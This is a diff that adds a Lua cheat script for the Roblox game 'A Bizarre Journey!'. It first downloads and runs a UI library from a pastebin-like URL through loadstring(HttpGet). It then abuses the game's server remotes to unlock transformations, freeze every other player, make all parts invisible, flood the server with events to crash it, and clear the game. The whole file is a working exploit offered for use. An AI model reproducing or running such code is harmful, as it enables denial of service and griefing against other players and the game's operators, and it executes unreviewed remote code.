@@ -1,0 +1,374 @@
+local Framework = loadstring(game:HttpGet("https://pastebinp.com/raw/KP1dUHFg"))()
+local Watermark = Framework:CreateWatermark("ELITE | {game} | {fps}")
+local WriteLine = Framework:CreateWindow("A Bizarre Journey! | 1.0.1", Vector2.new(492, 588), Enum.KeyCode.RightControl)
+
+local General = WriteLine:CreateTab("Main")
+local Main = General:CreateSector("Main", "left")
+local Misc = General:CreateSector("Misc", "right")
+
+Main:AddSeperator("Transforms")
+
+Main:AddButton("Samurai", function()
+    game:GetService("ReplicatedStorage").Samurai:FireServer()   
+end)
+
+Main:AddButton("Oni", function()
+    game:GetService("ReplicatedStorage").Oni:FireServer()
+end)
+
+Main:AddButton("Gojo", function()
+    game:GetService("ReplicatedStorage").Gojo:FireServer()
+end)
+
+Main:AddButton("Smug Dancer", function()
+    game:GetService("ReplicatedStorage").SmugDancer:FireServer()
+end)
+
+Main:AddButton("Kars", function()
+    game:GetService("ReplicatedStorage").Kars:FireServer()
+end)
+
+
+Main:AddButton("The Sonic", function()
+    game:GetService("ReplicatedStorage").TheSonic:FireServer()
+end)
+
+Main:AddButton("AnotherNewMask", function()
+    game:GetService("ReplicatedStorage").AnotherNewMask:FireServer()
+end)
+
+Main:AddButton("ULF", function()
+    game:GetService("ReplicatedStorage").ULF:FireServer()
+end)
+
+Main:AddButton("UltraInstinct", function()
+    game:GetService("ReplicatedStorage").UltraInstinct:FireServer()
+end)
+
+Main:AddButton("HiddenBeastSpec", function()
+    game:GetService("ReplicatedStorage").HiddenBeastSpec:FireServer()
+end)
+
+Main:AddButton("ShinySword", function()
+    game:GetService("ReplicatedStorage").ShinySword:FireServer()
+end)
+
+Main:AddButton("Sword", function()
+    game:GetService("ReplicatedStorage").Sword:FireServer()
+end)
+
+Main:AddButton("TheExe", function()
+    game:GetService("ReplicatedStorage").TheExe:FireServer()
+end)
+
+Main:AddButton("PurpleGuyBruh", function()
+    game:GetService("ReplicatedStorage").PurpleGuyBruh:FireServer()
+end)
+
+Main:AddButton("MasteredUltraInstinct", function()
+    game:GetService("ReplicatedStorage").MasteredUltraInstinct:FireServer()
+end)
+
+Main:AddButton("FriskEpicStand", function()
+    game:GetService("ReplicatedStorage").FriskEpicStand:FireServer()
+end)
+
+Main:AddButton("OneMorePumpkin", function()
+    game:GetService("ReplicatedStorage").OneMorePumpkin:FireServer()
+end)
+
+Main:AddButton("Reaper", function()
+    game:GetService("ReplicatedStorage").Reaper:FireServer()
+end)
+
+Main:AddButton("HyperSonicSpec", function()
+    game:GetService("ReplicatedStorage").HyperSonicSpec:FireServer()
+end)
+
+Main:AddButton("GalaxyXSansSpec", function()
+    game:GetService("ReplicatedStorage").GalaxyXSansSpec:FireServer()
+end)
+
+Main:AddButton("XSansSpec", function()
+    game:GetService("ReplicatedStorage").XSansSpec:FireServer()
+end)
+
+Main:AddButton("DeltaSans", function()
+    game:GetService("ReplicatedStorage").DeltaSans:FireServer()
+end)
+
+Main:AddButton("OneMoreTime", function()
+    game:GetService("ReplicatedStorage").OneMoreTime:FireServer()
+end)
+
+Main:AddButton("DoomSlayer", function()
+    game:GetService("ReplicatedStorage").DoomSlayer:FireServer()
+end)
+
+Main:AddButton("SSChara", function()
+    game:GetService("ReplicatedStorage").SSChara:FireServer()
+end)
+
+Main:AddButton("AnotherGoodParty", function()
+    game:GetService("ReplicatedStorage").AnotherGoodParty:FireServer()
+end)
+
+Main:AddButton("imposter", function()
+    game:GetService("ReplicatedStorage").imposter:FireServer()
+end)
+
+Main:AddButton("CharaEpicStand", function()
+    game:GetService("ReplicatedStorage").CharaEpicStand:FireServer()
+end)
+
+Main:AddButton("Genos", function()
+    game:GetService("ReplicatedStorage").Genos:FireServer()
+end)
+
+Main:AddButton("SCR", function()
+    game:GetService("ReplicatedStorage").SCR:FireServer()
+end)
+
+Main:AddButton("SHINYSCRSCR", function()
+    game:GetService("ReplicatedStorage").SHINYSCR:FireServer()
+end)
+
+Main:AddButton("FNFGarMod", function()
+    game:GetService("ReplicatedStorage").FNFGarMod:FireServer()
+end)
+
+Main:AddButton("FNFISCOOL", function()
+    game:GetService("ReplicatedStorage").FNFISCOOL:FireServer()
+end)
+
+Main:AddButton("Yone", function()
+    game:GetService("ReplicatedStorage").Yone:FireServer()
+end)
+
+Main:AddButton("FunnyClownSpec", function()
+    game:GetService("ReplicatedStorage").FunnyClownSpec:FireServer()
+end)
+
+Main:AddToggle("Deflect Damage", false ,function(v)
+game:GetService("ReplicatedStorage").Deflect:FireServer(v)
+end)
+
+Main:AddToggle("RTZ", false ,function(v)
+game:GetService("ReplicatedStorage").RTZ:FireServer(v)
+end)
+
+Main:AddToggle("Block", false ,function(v)
+game:GetService("ReplicatedStorage").Block:FireServer(v)
+end)
+
+Main:AddToggle("SuperArmor", false ,function(v)
+game:GetService("ReplicatedStorage").SuperArmor:FireServer(v)
+end)
+
+Main:AddToggle("Rainbow Trail", false ,function(v)
+local min, max, abs = math.min, math.max, math.abs
+
+local Hsx = {}
+
+function Hsx.rgb2hsv( r, g, b )
+    local M, m = max( r, g, b ), min( r, g, b )
+    local C = M - m
+    local K = 1.0/(6.0 * C)
+    local h = 0.0
+    if C ~= 0.0 then
+        if M == r then     h = ((g - b) * K) % 1.0
+        elseif M == g then h = (b - r) * K + 1.0/3.0
+        else               h = (r - g) * K + 2.0/3.0
+        end
+    end
+    return h, M == 0.0 and 0.0 or C / M, M
+end
+
+function Hsx.hsv2rgb( h, s, v )
+    local C = v * s
+    local m = v - C
+    local r, g, b = m, m, m
+    if h == h then
+        local h_ = (h % 1.0) * 6
+        local X = C * (1 - abs(h_ % 2 - 1))
+        C, X = C + m, X + m
+        if     h_ < 1 then r, g, b = C, X, m
+        elseif h_ < 2 then r, g, b = X, C, m
+        elseif h_ < 3 then r, g, b = m, C, X
+        elseif h_ < 4 then r, g, b = m, X, C
+        elseif h_ < 5 then r, g, b = X, m, C
+        else               r, g, b = C, m, X
+        end
+    end
+    return r, g, b
+end
+
+function Hsx.rgb2hsl( r, g, b )
+    local M, m = max( r, g, b ), min( r, g, b )
+    local C = M - m
+    local K = 1.0 / (6*C)
+    local h = 0
+    if C ~= 0 then
+        if M == r then     h = ((g - b) * K) % 1.0
+        elseif M == g then h = (b - r) * K + 1.0/3.0
+        else               h = (r - g) * K + 2.0/3.0
+        end
+    end
+    local l = 0.5 * (M + m)
+    local s = 0
+    if l > 0 and l < 1 then
+        s = C / (1-abs(l + l - 1))
+    end
+    return h, s, l
+end
+
+function Hsx.hsl2rgb( h, s, l )
+    local C = ( 1 - abs( l + l - 1 ))*s
+    local m = l - 0.5*C
+    local r, g, b = m, m, m
+    if h == h then
+        local h_ = (h % 1.0) * 6.0
+        local X = C * (1 - abs(h_ % 2 - 1))
+        C, X = C + m, X + m
+        if     h_ < 1 then r, g, b = C, X, m
+        elseif h_ < 2 then r, g, b = X, C, m
+        elseif h_ < 3 then r, g, b = m, C, X
+        elseif h_ < 4 then r, g, b = m, X, C
+        elseif h_ < 5 then r, g, b = X, m, C
+        else               r, g, b = C, m, X
+        end
+    end
+    return r, g, b
+end
+
+
+local NAN = 0/0
+
+function Hsx.rgb2hsi( r, g, b )
+    local M, m = max( r, g, b ), min( r, g, b )
+    local C = M - m
+    local K = 1.0 / (6*C)
+    local h = NAN
+    if     C ~= 0 then
+        if M == r then     h = ((g - b) * K % 1.0)
+        elseif M == g then h = (b - r) * K + 1.0/3.0
+        else               h = (r - g) * K + 2.0/3.0
+        end
+    end
+    local i = (r + g + b) * (1.0/3.0)
+    local s = i == 0.0 and 0.0 or (1.0 - m/i)
+    return h, s, i
+end
+
+function Hsx.hsi2rgb( h, s, i )
+    local cos, PI2 = math.cos, math.pi*2
+    h = ( h % 1.0 )
+    local r, g, b
+    if     h <= 1.0/3.0 then
+        b = 1.0 - s
+        r = 1.0 + s*cos( h*PI2 )/cos( (1.0/6.0 - h)*PI2 )
+        g = 3.0 - r - b
+    elseif h <= 2.0/3.0 then
+        h = h - 1.0/3.0
+        r = 1.0 - s
+        g = 1.0 + s*cos( h*PI2 )/cos( (1.0/6.0 - h )*PI2 )
+        b = 3.0 - r - g
+    else
+        h = h - 2.0/3.0
+        g = 1.0 - s
+        b = 1.0 + s*cos( h*PI2 )/cos( (1.0/6.0 - h )*PI2 )
+        r = 3.0 - g - b
+    end
+    return i * r, i * g, i * b
+end
+
+local t = 1 -- time to rainbow deez nutz
+local r = math.random() * t
+getgenv().RainbowTrail = v
+
+while RainbowTrail do wait()
+   local hue = (tick()+r) % t / t
+   game:GetService('ReplicatedStorage').VampireDash:FireServer(BrickColor.new(Hsx.hsv2rgb(hue, 1 ,1)))
+   game:GetService('ReplicatedStorage').Jump:FireServer(BrickColor.new(Hsx.hsv2rgb(hue, 1 ,1)))
+end
+end)
+
+
+Misc:AddSeperator("Freeze/UnFreeze")
+
+Misc:AddButton("Freeze all", function()
+    for i,v in pairs(game.Players:GetChildren()) do
+        if v.Name ~= game.Players.LocalPlayer.Name then
+            game:GetService("ReplicatedStorage").Anchor:FireServer(v.Character.HumanoidRootPart, true)
+            game:GetService("ReplicatedStorage").Anchor:FireServer(v.Character.Head, true)
+        end
+    end 
+end)
+
+Misc:AddButton("UnFreeze all", function()
+    for i,v in pairs(game.Players:GetChildren()) do
+        if v.Name ~= game.Players.LocalPlayer.Name then
+            game:GetService("ReplicatedStorage").Anchor:FireServer(v.Character.HumanoidRootPart, false)
+            game:GetService("ReplicatedStorage").Anchor:FireServer(v.Character.Head, false)
+        end
+    end 
+end)
+
+Misc:AddSeperator("Invisible/Visible")
+
+Misc:AddButton("Invisible Everything", function()
+    for i,v in pairs(game.Workspace:GetDescendants()) do
+        if v:IsA("Part") or v:IsA("MeshPart") then
+            game.ReplicatedStorage.Transparency:FireServer(v, 1)
+        end
+    end
+end)
+
+Misc:AddButton("Visible Everything", function()
+    for i,v in pairs(game.Workspace:GetDescendants()) do
+        if v:IsA("Part") or v:IsA("MeshPart") then
+            game.ReplicatedStorage.Transparency:FireServer(v, 0)
+        end
+    end
+end)
+
+Misc:AddSeperator("Other")
+
+Misc:AddButton("Crash Game", function()
+    game:GetService('RunService').Heartbeat:Connect(function()
+        for i = 1,100 do
+            game:GetService("ReplicatedStorage").SmugDancer:FireServer()
+            game:GetService("ReplicatedStorage").Kars:FireServer()
+            game:GetService("ReplicatedStorage").TheSonic:FireServer()
+            game:GetService("ReplicatedStorage").AnotherNewMask:FireServer()
+            game:GetService("ReplicatedStorage").ULF:FireServer()
+            game:GetService("ReplicatedStorage").UltraInstinct:FireServer()
+            game:GetService("ReplicatedStorage").TheExe:FireServer()
+            game:GetService("ReplicatedStorage").PurpleGuyBruh:FireServer()
+            game:GetService("ReplicatedStorage").MasteredUltraInstinct:FireServer()
+            game:GetService("ReplicatedStorage").FriskEpicStand:FireServer()
+            game:GetService("ReplicatedStorage").OneMorePumpkin:FireServer()
+            game:GetService("ReplicatedStorage").Reaper:FireServer()
+            game:GetService("ReplicatedStorage").HyperSonicSpec:FireServer()
+            game:GetService("ReplicatedStorage").GalaxyXSansSpec:FireServer()
+            game:GetService("ReplicatedStorage").XSansSpec:FireServer()
+            game:GetService("ReplicatedStorage").DeltaSans:FireServer()
+            game:GetService("ReplicatedStorage").OneMoreTime:FireServer()
+            game:GetService("ReplicatedStorage").DoomSlayer:FireServer()
+            game:GetService("ReplicatedStorage").SSChara:FireServer()
+            game:GetService("ReplicatedStorage").AnotherGoodParty:FireServer()
+            game:GetService("ReplicatedStorage").imposter:FireServer()
+            game:GetService("ReplicatedStorage").CharaEpicStand:FireServer()
+            game:GetService("ReplicatedStorage").Genos:FireServer()
+        end
+    end)
+end)
+
+Misc:AddToggle("Clear Game", false,function(v)
+_G.Clear = v
+game:GetService('RunService').Heartbeat:Connect(function()
+    if _G.Clear == true then
+        game:GetService("ReplicatedStorage").CommandClean:FireServer()
+    end
+end)
+end)
